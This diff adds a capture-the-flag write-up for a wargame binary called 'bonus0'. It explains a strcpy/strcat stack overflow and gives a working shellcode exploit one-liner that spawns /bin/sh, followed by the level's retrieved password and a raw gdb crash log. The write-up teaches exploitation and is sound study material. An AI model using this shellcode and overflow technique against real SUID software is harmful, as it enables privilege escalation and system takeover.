@@ -1,0 +1,122 @@
+#### What We Know
+
+From our analysis, we have identified several key vulnerabilities in the `bonus0` binary:
+
+1. **Buffer Overflow in `pp` Function**
+   - The function `pp(dest)` calls `p(src, " - ")` and `p(v3, " - ")` to take user input into `src` (20 bytes) and `v3` (28 bytes).
+   - These buffers are copied into `dest` (42 bytes) using `strcpy(dest, src)` and `strcat(dest, v3)`, both of which **do not check for buffer size limits**.
+   - This can **overwrite the saved return address** on the stack, leading to code execution control.
+
+2. **Stack Execution Allowed (`NX Disabled`)**
+   - Since NX is **disabled**, we can execute shellcode placed in our input buffer.
+   - This allows us to inject **a shell-spawning payload** and execute arbitrary commands.
+
+3. **Fixed Memory Layout (`No PIE`)**
+   - The binary has a fixed memory layout, making it **easier to predict memory addresses** for return-oriented programming (ROP) or direct shellcode execution.
+
+### **Exploit Strategy**
+
+1. **Control the Stack via Buffer Overflow**
+   - The goal is to overflow `s` in `main()` and overwrite the **return address**.
+   - By carefully crafting our input, we can direct execution to a shellcode payload.
+
+2. **Inject Executable Shellcode**
+   - Since NX is disabled, we place shellcode directly into our input to spawn a shell (`/bin/sh`).
+
+3. **Redirect Execution to Our Payload**
+   - We overwrite the return address with the **stack address** where our shellcode is stored.
+
+### **Building the Exploit**
+
+The proof-of-concept exploit consists of:
+
+- **First Input**: Inject shellcode padded with NOPs (`0x90`).
+- **Second Input**: Overwrite the return address to point to our shellcode.
+
+```bash
+(python -c 'print("\x90"*42 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'; \
+ python -c 'print("A" * 9 + "\xd0\xe6\xff\xbf" + "\x90" * 8)'; cat) | ./bonus0
+```
+
+### **Exploit Breakdown**
+
+1. **First Input (Shellcode Injection)**
+   - We insert **NOP sleds (`\x90`)** followed by a shell-spawning payload.
+   - The shellcode executes `/bin/sh` by invoking a system call (`execve`).
+
+2. **Second Input (Stack Overflow and Return Address Overwrite)**
+   - We write **9 padding bytes** (`A` characters) to align the stack.
+   - We overwrite the return address with `\xd0\xe6\xff\xbf` (address pointing to our shellcode).
+   - Additional NOPs ensure smooth execution in case of minor alignment issues.
+
+### **Executing the Exploit**
+
+After running the exploit, we escalate privileges:
+
+```bash
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
+
+### **Conclusion**
+
+- This exploit leverages **a classic stack buffer overflow** due to unchecked `strcpy` and `strcat` operations.
+- The lack of **stack canaries** allows overwriting the return address without detection.
+- The absence of **NX protection** enables direct shellcode execution.
+- **SUID permissions** allow us to escalate privileges and retrieve the `bonus1` user’s password.
+
+By combining these factors, we successfully gain a shell as `bonus1`, achieving privilege escalation.
+
+
+
+
+gdb-peda$ r < <(python -c 'print("A"*48 + "\n" + "C" * 24 +  "B" * 8)')
+ - 
+ - 
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0xb7fd0ff4 --> 0x1a4d7c 
+ECX: 0x0 
+EDX: 0x1 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbffff688 --> 0xbffff6e8 --> 0xbffff738 --> 0x0 
+ESP: 0xbfffe670 --> 0xbfffe680 ('A' <repeats 48 times>)
+EIP: 0x80484fc (<p+72>:	mov    BYTE PTR [eax],0x0)
+EFLAGS: 0x210246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80484ee <p+58>:	lea    eax,[ebp-0x1008]
+   0x80484f4 <p+64>:	mov    DWORD PTR [esp],eax
+   0x80484f7 <p+67>:	call   0x80483d0 <strchr@plt>
+=> 0x80484fc <p+72>:	mov    BYTE PTR [eax],0x0
+   0x80484ff <p+75>:	lea    eax,[ebp-0x1008]
+   0x8048505 <p+81>:	mov    DWORD PTR [esp+0x8],0x14
+   0x804850d <p+89>:	mov    DWORD PTR [esp+0x4],eax
+   0x8048511 <p+93>:	mov    eax,DWORD PTR [ebp+0x8]
+[------------------------------------stack-------------------------------------]
+0000| 0xbfffe670 --> 0xbfffe680 ('A' <repeats 48 times>)
+0004| 0xbfffe674 --> 0xa ('\n')
+0008| 0xbfffe678 --> 0x1000 
+0012| 0xbfffe67c --> 0x0 
+0016| 0xbfffe680 ('A' <repeats 48 times>)
+0020| 0xbfffe684 ('A' <repeats 44 times>)
+0024| 0xbfffe688 ('A' <repeats 40 times>)
+0028| 0xbfffe68c ('A' <repeats 36 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x080484fc in p ()
+gdb-peda$ x/40wx $esp 
+0xbfffe670:	0xbfffe680	0x0000000a	0x00001000	0x00000000
+0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe690:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffe6b0:	0x43434300	0x43434343	0x43434343	0x43434343
+0xbfffe6c0:	0x43434343	0x43434343	0x42424243	0x42424242
+0xbfffe6d0:	0x00000a42	0x00000000	0x00000000	0x00000000
+0xbfffe6e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe6f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffe700:	0x00000000	0x00000000	0x00000000	0x00000000
